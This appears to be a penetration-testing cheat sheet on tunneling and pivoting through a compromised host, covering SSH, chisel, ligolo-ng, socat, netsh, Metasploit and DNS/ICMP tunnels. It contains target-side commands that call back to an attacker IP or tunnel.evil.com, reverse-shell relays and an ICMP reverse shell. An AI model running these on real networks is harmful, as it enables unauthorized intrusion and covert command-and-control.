---
title: "Tunneling & Pivoting"
date: 2026-03-16
draft: false
tags:
  - tunneling
  - pivoting
  - port-forwarding
  - chisel
  - ligolo
  - ssh
categories:
  - tools-and-techniques
description: "Every tunneling method you'll ever need. SSH, chisel, ligolo, socat, and more."
---

Every method. Copy-paste the command. Move on.

Conventions: `10.10.14.x` = attacker, `172.16.0.x` = internal target, `pivot` = compromised dual-homed host.

---

## SSH Tunneling

The foundation. If you have SSH creds to a pivot host, you have everything you need.

### Local port forward (-L)

Route traffic from your machine through the pivot to an internal target.

```bash
# Access 172.16.0.10:80 via pivot, available at localhost:8080
ssh -L 8080:172.16.0.10:80 user@pivot -N
```

Now `curl http://127.0.0.1:8080` hits the internal web app. The pivot does the routing.

```
[attacker:8080] ──ssh──> [pivot] ──> [172.16.0.10:80]
```

### Remote / reverse port forward (-R)

Expose a target's internal service back to your machine. Useful when the target can reach the pivot but you can't reach the target directly.

```bash
# Run on target (or pivot): expose target's 3306 back to attacker's 9001
ssh -R 9001:127.0.0.1:3306 attacker@10.10.14.5 -N
```

Now `mysql -h 127.0.0.1 -P 9001` on your attacker box hits the target's MySQL.

```
[attacker:9001] <──ssh── [target/pivot] ──> [127.0.0.1:3306]
```

### Dynamic SOCKS proxy (-D)

Route everything through the pivot. Pairs with proxychains.

```bash
ssh -D 1080 user@pivot -N
```

proxychains config (`/etc/proxychains4.conf`):

```
[ProxyList]
socks5 127.0.0.1 1080
```

Now prefix any command with `proxychains`:

```bash
proxychains nmap -sT -Pn 172.16.0.0/24
proxychains curl http://172.16.0.10
```

{{< callout type="warning" >}}
proxychains only works with TCP. No UDP, no ICMP. `nmap` must use `-sT` (connect scan), not `-sS` (SYN scan). Ping won't work — use `-Pn`.
{{< /callout >}}

### Double pivot (SSH over SSH)

Chain through multiple hops. ProxyJump is the clean way:

```bash
ssh -J user1@pivot1,user2@pivot2 user3@172.16.0.10
```

Or nest dynamic proxies:

```bash
# Hop 1: SOCKS through pivot1
ssh -D 1080 user@pivot1 -N

# Hop 2: SOCKS through pivot2 via hop 1
proxychains ssh -D 1081 user@pivot2 -N
```

### SSH tips

```bash
# No shell, just tunnel — combine these
ssh -N -f user@pivot  # -N = no shell, -f = background

# Skip host key check (noisy lab, don't care)
ssh -o StrictHostKeyChecking=no user@pivot

# Add tunnel to existing session: press ~C (tilde, shift-C)
# Then type the -L/-R/-D command at the ssh> prompt

# sshuttle — VPN-like, no SOCKS needed, routes entire subnets
sshuttle -r user@pivot 172.16.0.0/24
```

{{< callout type="note" >}}
`ssh -A` forwards your agent keys to the pivot. Convenient for hopping but dangerous — anyone with root on the pivot can use your keys. Don't do it on untrusted hosts.
{{< /callout >}}

---

## Chisel

The go-to when SSH isn't available. Single binary, works on Linux and Windows, tunnels over HTTP.

### Reverse SOCKS proxy (most common)

{{< terminal title="attacker" >}}
chisel server --reverse -p 8080
{{< /terminal >}}

{{< terminal title="target" >}}
./chisel client 10.10.14.5:8080 R:socks
{{< /terminal >}}

SOCKS5 proxy is now on `attacker:1080`. Use with proxychains as above.

### Forward a single port

```bash
# On target: forward attacker:8888 to internal 172.16.0.10:80
./chisel client 10.10.14.5:8080 8888:172.16.0.10:80
```

### Reverse port forward

```bash
# On target: expose target's local 3306 on attacker:9001
./chisel client 10.10.14.5:8080 R:9001:127.0.0.1:3306
```

### Tips

- Transfer the binary: `python3 -m http.server 80` on attacker, `wget`/`curl`/`certutil` on target
- It's an HTTP Upgrade connection — blends with web traffic, gets through most proxies
- Windows: `chisel.exe` — same syntax, same flags
- Specify bind address on server: `chisel server --reverse -p 8080 --host 0.0.0.0`

---

## Ligolo-ng

Full network pivoting. No SOCKS, no proxychains — you get actual routes to internal subnets. Significantly faster than chisel for scanning.

### Setup

{{< terminal title="attacker" >}}
# Create the tun interface (once)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Start proxy
ligolo-proxy -selfcert -laddr 0.0.0.0:11601
{{< /terminal >}}

{{< terminal title="target" >}}
./ligolo-agent -connect 10.10.14.5:11601 -ignore-cert
{{< /terminal >}}

### Usage

In the ligolo proxy console:

```
» session                              # select agent
» ifconfig                             # see target's interfaces
```

Back on attacker's shell, add routes:

```bash
sudo ip route add 172.16.0.0/24 dev ligolo
```

Back in ligolo:

```
» start
```

Done. `nmap 172.16.0.10`, `curl http://172.16.0.10`, whatever — it just works. No proxychains.

### Reverse connections through the tunnel

Need a callback from an internal host through ligolo back to you?

```
» listener_add --addr 0.0.0.0:4444 --to 10.10.14.5:4444 --tcp
```

Now anything connecting to `pivot:4444` gets forwarded to `attacker:4444`. Launch your reverse shell payload pointing at the pivot's IP.

### Tips

- Multiple agents = multiple sessions = multiple pivots at once
- Way faster than SOCKS for nmap scans
- Agent is a single Go binary — compile for target OS/arch or grab from releases

---

## Socat

Swiss army knife. Relay anything to anywhere.

### Simple port forward

```bash
# On pivot: forward 8080 to internal 172.16.0.10:80
socat TCP-LISTEN:8080,fork TCP:172.16.0.10:80
```

### Reverse shell relay

Target can reach pivot but not attacker. Relay through:

```bash
# On pivot: relay incoming 1234 to attacker's 4444
socat TCP-LISTEN:1234,fork TCP:10.10.14.5:4444
```

Fire reverse shell at `pivot:1234`, catch on `attacker:4444`.

### Encrypted relay

```bash
# Generate cert
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1 -out bind.crt
cat bind.key bind.crt > bind.pem

# Encrypted listener forwarding to local service
socat OPENSSL-LISTEN:443,cert=bind.pem,verify=0,fork TCP:127.0.0.1:80
```

### File transfer

```bash
# Receiver
socat TCP-LISTEN:9999 file:output.txt,create

# Sender
socat TCP:172.16.0.10:9999 file:input.txt
```

---

## plink.exe (Windows SSH)

PuTTY's CLI version. For when you land on Windows and need SSH tunneling.

### Local forward

```cmd
plink.exe -ssh -L 8080:172.16.0.10:80 user@pivot -pw password -N
```

### Reverse forward

```cmd
plink.exe -ssh -R 9001:127.0.0.1:3389 user@10.10.14.5 -pw password -N
```

### Auto-accept host key

```cmd
echo y | plink.exe -ssh -L 8080:172.16.0.10:80 user@pivot -pw password -N
```

{{< callout type="note" >}}
Download from the PuTTY site or transfer from your attacker box. It's a single `.exe`, no install needed.
{{< /callout >}}

---

## netsh (Windows Native)

Already on the box. No uploads. No installs.

### Port forward

```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.0.10
```

### List all forwards

```cmd
netsh interface portproxy show all
```

### Remove

```cmd
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

{{< callout type="warning" >}}
Requires admin privileges. Also need to make sure the Windows firewall allows the listen port — `netsh advfirewall firewall add rule name="pivot" protocol=TCP dir=in localport=8080 action=allow`
{{< /callout >}}

---

## Metasploit (portfwd + autoroute)

If you already have a meterpreter session:

```
# Forward local 8080 to internal target's 80
meterpreter > portfwd add -l 8080 -p 80 -r 172.16.0.10

# Route entire subnet through session
meterpreter > run autoroute -s 172.16.0.0/24

# Stand up SOCKS proxy for proxychains
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > run -j
```

Now use proxychains with port 1080 to reach the internal subnet.

---

## DNS Tunneling

When only UDP 53 gets out. Slow as hell but sometimes it's all you've got.

### dnscat2

{{< terminal title="attacker" >}}
# Start server (need a domain you control, or use direct mode)
ruby dnscat2.rb --dns "domain=tunnel.evil.com" --no-cache
{{< /terminal >}}

{{< terminal title="target" >}}
./dnscat --dns "domain=tunnel.evil.com,server=10.10.14.5"
{{< /terminal >}}

In the dnscat2 console:

```
dnscat2> session -i 1
command (target) > shell
command (target) > listen 0.0.0.0:8080 172.16.0.10:80   # port forward
```

### iodine

Gives you a full IP-over-DNS tunnel with a tun interface.

{{< terminal title="attacker (needs root)" >}}
iodined -f -c -P password 10.0.0.1/24 tunnel.evil.com
{{< /terminal >}}

{{< terminal title="target" >}}
iodine -f -P password tunnel.evil.com
{{< /terminal >}}

Now you have a point-to-point link: attacker `10.0.0.1` <-> target `10.0.0.2`. Route and forward as needed.

{{< callout type="note" >}}
DNS tunneling requires you to own a domain with NS records pointing to your attacker box. Or use direct mode (no real DNS resolution) if the target can hit your IP on UDP 53.
{{< /callout >}}

---

## ICMP Tunneling

When DNS is blocked too but ICMP (ping) is allowed. Rare but it happens.

### icmpsh

Simple reverse shell over ICMP. No libraries, no install.

{{< terminal title="attacker" >}}
# Disable kernel ICMP replies first
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1

python3 icmpsh_m.py 10.10.14.5 172.16.0.10
{{< /terminal >}}

{{< terminal title="target (Windows)" >}}
icmpsh.exe -t 10.10.14.5
{{< /terminal >}}

### ptunnel-ng

TCP-over-ICMP. Full tunnel, not just a shell.

{{< terminal title="attacker" >}}
ptunnel-ng -r 10.10.14.5 -R 22
{{< /terminal >}}

{{< terminal title="target" >}}
ptunnel-ng -p 10.10.14.5 -l 2222 -r 10.10.14.5 -R 22
{{< /terminal >}}

Then SSH through the ICMP tunnel:

```bash
ssh -p 2222 user@127.0.0.1
```

---

## Quick Reference

| Scenario | Tool | Command |
|----------|------|---------|
| SSH access to pivot | SSH `-L`/`-R`/`-D` | `ssh -D 1080 user@pivot -N` |
| Route entire subnet via SSH | sshuttle | `sshuttle -r user@pivot 172.16.0.0/24` |
| No SSH, can upload binary | Chisel | `chisel client ATK:8080 R:socks` |
| Full subnet routing, no SOCKS | Ligolo-ng | proxy + agent + `ip route add` |
| Windows, no tools allowed | netsh | `netsh interface portproxy add v4tov4 ...` |
| Windows, have plink | plink | `plink.exe -ssh -L 8080:TARGET:80 user@pivot` |
| Simple port relay | socat | `socat TCP-LISTEN:8080,fork TCP:TARGET:80` |
| Have meterpreter | MSF portfwd | `portfwd add -l 8080 -p 80 -r TARGET` |
| Only DNS gets out | dnscat2 / iodine | DNS tunnel |
| Only ICMP gets out | ptunnel-ng | ICMP tunnel |
